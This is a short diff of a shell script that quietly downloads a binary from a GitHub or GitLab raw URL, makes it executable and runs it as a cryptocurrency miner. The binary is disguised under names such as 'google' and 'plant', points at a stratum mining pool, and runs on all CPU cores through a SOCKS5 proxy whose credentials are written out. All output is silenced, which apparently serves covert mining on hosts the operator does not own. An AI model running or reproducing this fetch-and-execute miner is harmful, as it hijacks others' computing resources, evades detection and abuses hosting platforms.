@@ -1,3 +1,6 @@
-wget https://github.com/aurbach55/sugeh-ice/raw/main/google >/dev/null 2>&1 && chmod 777 google >/dev/null 2>&1
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant >/dev/null 2>&1
 
-nohup ./google -a yespower -o stratum+tcp://103.249.70.7:6533 -u ltc1q5r0fy6ht74mrlaqtcw5duple2ppjppgf6qehm7 -p c=LTC  -t $(nproc --ignore 1) > nohup.out >/dev/null 2>&1
+chmod +x ./plant >/dev/null 2>&1
+
+./plant -a yespowerTIDE -o stratum+tcp://198.50.168.213:6239 -u RQjwg61Gffx78kYL2GuWp1GmwSabfcKX33.Tet -p c=KORE -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+   
